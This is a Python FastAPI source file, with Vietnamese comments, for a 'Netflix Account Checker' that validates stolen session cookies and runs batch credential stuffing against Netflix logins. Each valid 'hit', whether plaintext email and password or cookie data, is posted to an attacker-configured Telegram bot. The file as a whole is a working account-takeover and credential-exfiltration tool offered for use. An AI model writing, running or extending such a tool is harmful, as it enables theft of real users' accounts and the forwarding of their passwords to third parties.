"""
Netflix Account Checker API - Tích hợp cookie checker + email:password checker
"""
import asyncio
import os
import logging
import hashlib
import time
from typing import Optional

from fastapi import FastAPI, File, UploadFile, Form, HTTPException
from fastapi.responses import JSONResponse, FileResponse, HTMLResponse
from pydantic import BaseModel
import httpx

# Import utilities
from utils.parser import parse_cookie_content, extract_netflix_id, extract_email_from_cookie
from utils.generator import generate_account_info, generate_token
from utils.telegram import send_telegram_hit, test_telegram_bot
from netflix_login import NetflixLogin, AccountStatus
from checker_utils import load_combos, format_combo, get_random_user_agent

# Cấu hình logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = FastAPI(
    title="Netflix Account Checker API",
    version="2.0.0",
    description="API for checking Netflix cookies and email:password accounts",
    docs_url="/docs",
    redoc_url=None,
    openapi_url="/openapi.json"
)

# ==================== MODELS ====================

class CheckRequest(BaseModel):
    content: str
    mode: str

class EmailPasswordRequest(BaseModel):
    email: str
    password: str

class BatchEmailPasswordRequest(BaseModel):
    combos: list  # List of {"email": "...", "password": "..."}

class TelegramConfig(BaseModel):
    enabled: bool
    bot_token: str
    chat_id: str

# ==================== GLOBAL VARIABLES ====================

telegram_configs = {
    "enabled": False,
    "bot_token": "",
    "chat_id": ""
}

account_cache = {}
cache_ttl = 300

# ==================== STATIC FILES ====================

@app.get("/", response_class=HTMLResponse)
async def serve_index():
    """Serve index.html"""
    try:
        with open("static/index.html", "r", encoding="utf-8") as f:
            content = f.read()
        return HTMLResponse(content=content)
    except FileNotFoundError:
        return HTMLResponse(content="""
        <!DOCTYPE html>
        <html>
        <head><title>Netflix Account Checker</title></head>
        <body>
            <h1>Netflix Account Checker API v2.0</h1>
            <p>API is running.</p>
            <p><a href="/docs">View API Documentation</a></p>
        </body>
        </html>
        """)

@app.get("/{path:path}")
async def serve_static(path: str):
    """Serve static files"""
    if path.startswith("api/") or path == "docs" or path == "openapi.json":
        raise HTTPException(status_code=404, detail="Not found")

    file_path = f"static/{path}"
    if os.path.exists(file_path) and os.path.isfile(file_path):
        return FileResponse(file_path)

    try:
        with open("static/index.html", "r", encoding="utf-8") as f:
            content = f.read()
        return HTMLResponse(content=content)
    except FileNotFoundError:
        raise HTTPException(status_code=404, detail="File not found")

# ==================== TELEGRAM CONFIG ====================

@app.post("/api/telegram-config")
async def set_telegram_config(config: TelegramConfig):
    """Lưu cấu hình Telegram"""
    global telegram_configs
    telegram_configs = {
        "enabled": config.enabled,
        "bot_token": config.bot_token,
        "chat_id": config.chat_id
    }

    if config.enabled and config.bot_token and config.chat_id:
        test_result = await test_telegram_bot(config.bot_token, config.chat_id)
        if not test_result:
            return JSONResponse(
                status_code=400,
                content={"status": "error", "message": "Telegram bot không hợp lệ"}
            )

    logger.info(f"Telegram config saved: enabled={config.enabled}")
    return JSONResponse(status_code=200, content={"status": "success", "message": "Cấu hình Telegram đã được lưu"})

# ==================== COOKIE CHECKING (EXISTING) ====================

@app.post("/api/check")
async def check_cookie(request: CheckRequest):
    """Check cookie đơn lẻ"""
    try:
        cookie_data = parse_cookie_content(request.content)
        netflix_id = extract_netflix_id(cookie_data)

        if not netflix_id:
            return JSONResponse(
                status_code=200,
                content={"status": "error", "message": "Không tìm thấy NetflixId trong cookie"}
            )

        cache_key = hashlib.md5(netflix_id.encode()).hexdigest()
        if cache_key in account_cache:
            cache_time, account_info, token_result = account_cache[cache_key]
            if time.time() - cache_time < cache_ttl:
                logger.info(f"Using cached account info for {netflix_id}")
            else:
                account_info = generate_account_info(cookie_data, request.content)
                token_result = generate_token(cookie_data, netflix_id)
                account_cache[cache_key] = (time.time(), account_info, token_result)
        else:
            account_info = generate_account_info(cookie_data, request.content)
            token_result = generate_token(cookie_data, netflix_id)
            account_cache[cache_key] = (time.time(), account_info, token_result)

        telegram_sent = False
        if telegram_configs.get('enabled') and account_info.get('ok', False):
            telegram_sent = await send_telegram_hit(account_info, token_result, request.content, telegram_configs)

        result = {
            "status": "success",
            "account_info": account_info,
            "token_result": token_result,
            "telegram_sent": telegram_sent
        }

        if request.mode == 'tokenonly':
            result = {"status": "success", "token_result": token_result, "telegram_sent": telegram_sent}

        return JSONResponse(status_code=200, content=result)

    except Exception as e:
        logger.error(f"Error in check_cookie: {str(e)}")
        return JSONResponse(status_code=200, content={"status": "error", "message": f"Lỗi: {str(e)}"})

@app.post("/api/batch-check")
async def batch_check(files: list[UploadFile] = File(...), mode: str = Form("fullinfo")):
    """Check nhiều file cookie"""
    try:
        results = []

        for file in files:
            try:
                content = (await file.read()).decode('utf-8', errors='ignore')
                cookie_data = parse_cookie_content(content)
                netflix_id = extract_netflix_id(cookie_data)

                if not netflix_id:
                    results.append({"status": "error", "filename": file.filename, "message": "Không tìm thấy NetflixId"})
                    continue

                account_info = generate_account_info(cookie_data, content)
                token_result = generate_token(cookie_data, netflix_id)

                result_item = {
                    "status": "success",
                    "filename": file.filename,
                    "netflix_id": netflix_id,
                    "account_info": account_info
                }

                if mode == 'fullinfo':
                    result_item["token_result"] = token_result
                else:
                    result_item["token_result"] = {"status": "Success", "token": token_result["token"]}

                results.append(result_item)

                if telegram_configs.get('enabled') and account_info.get('ok', False):
                    await send_telegram_hit(account_info, token_result, content, telegram_configs)

            except Exception as e:
                logger.error(f"Error processing file {file.filename}: {str(e)}")
                results.append({"status": "error", "filename": file.filename, "message": str(e)})

        return JSONResponse(status_code=200, content={"status": "success", "results": results})

    except Exception as e:
        logger.error(f"Error in batch_check: {str(e)}")
        return JSONResponse(status_code=500, content={"status": "error", "message": str(e)})

# ==================== EMAIL:PASSWORD CHECKING (NEW) ====================

@app.post("/api/check-email")
async def check_email_password(request: EmailPasswordRequest):
    """Check email:password đơn lẻ"""
    try:
        logger.info(f"Checking account: {request.email}")

        async with NetflixLogin(timeout=30) as netflix:
            result = await netflix.attempt_login(request.email, request.password)

        # Map status
        status_map = {
            AccountStatus.VALID: "valid",
            AccountStatus.INVALID: "invalid",
            AccountStatus.LOCKED: "locked",
            AccountStatus.CHALLENGE: "challenge",
            AccountStatus.ERROR: "error"
        }

        status = status_map.get(result.status, "error")

        response = {
            "status": "success",
            "email": request.email,
            "result": status,
            "message": result.message
        }

        # Gửi Telegram nếu valid
        if telegram_configs.get('enabled') and status == "valid":
            message = f"""
🌟 <b>NETFLIX ACCOUNT HIT</b> 🌟

📧 <b>Email:</b> <code>{request.email}</code>
🔑 <b>Password:</b> <code>{request.password}</code>
✅ <b>Status:</b> Valid Account

🎯 <b>Source:</b> Email Password Checker
"""
            try:
                url = f"https://api.telegram.org/bot{telegram_configs['bot_token']}/sendMessage"
                async with httpx.AsyncClient(timeout=10.0) as client:
                    await client.post(url, json={
                        "chat_id": telegram_configs['chat_id'],
                        "text": message,
                        "parse_mode": "HTML"
                    })
            except Exception as e:
                logger.error(f"Telegram error: {e}")

        return JSONResponse(status_code=200, content=response)

    except Exception as e:
        logger.error(f"Error in check_email_password: {str(e)}")
        return JSONResponse(status_code=200, content={"status": "error", "message": str(e)})

@app.post("/api/check-email-batch")
async def check_email_password_batch(request: BatchEmailPasswordRequest):
    """Check nhiều email:password"""
    try:
        combos = [(item["email"], item["password"]) for item in request.combos]
        logger.info(f"Batch checking {len(combos)} accounts")

        results = []

        async with NetflixLogin(timeout=30) as netflix:
            for email, password in combos:
                try:
                    result = await netflix.attempt_login(email, password)

                    status_map = {
                        AccountStatus.VALID: "valid",
                        AccountStatus.INVALID: "invalid",
                        AccountStatus.LOCKED: "locked",
                        AccountStatus.CHALLENGE: "challenge",
                        AccountStatus.ERROR: "error"
                    }

                    status = status_map.get(result.status, "error")

                    results.append({
                        "email": email,
                        "result": status,
                        "message": result.message
                    })

                    # Gửi Telegram nếu valid
                    if telegram_configs.get('enabled') and status == "valid":
                        message = f"""
🌟 <b>NETFLIX ACCOUNT HIT</b> 🌟

📧 <b>Email:</b> <code>{email}</code>
🔑 <b>Password:</b> <code>{password}</code>
✅ <b>Status:</b> Valid Account
"""
                        try:
                            url = f"https://api.telegram.org/bot{telegram_configs['bot_token']}/sendMessage"
                            async with httpx.AsyncClient(timeout=10.0) as client:
                                await client.post(url, json={
                                    "chat_id": telegram_configs['chat_id'],
                                    "text": message,
                                    "parse_mode": "HTML"
                                })
                        except:
                            pass

                    # Delay nhẹ giữa các request
                    await asyncio.sleep(0.5)

                except Exception as e:
                    results.append({"email": email, "result": "error", "message": str(e)})

        # Thống kê
        valid = sum(1 for r in results if r["result"] == "valid")
        invalid = sum(1 for r in results if r["result"] == "invalid")
        locked = sum(1 for r in results if r["result"] == "locked")
        errors = sum(1 for r in results if r["result"] == "error")

        return JSONResponse(status_code=200, content={
            "status": "success",
            "total": len(combos),
            "valid": valid,
            "invalid": invalid,
            "locked": locked,
            "error": errors,
            "results": results
        })

    except Exception as e:
        logger.error(f"Error in check_email_password_batch: {str(e)}")
        return JSONResponse(status_code=500, content={"status": "error", "message": str(e)})

# ==================== RUN LOCAL ====================

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
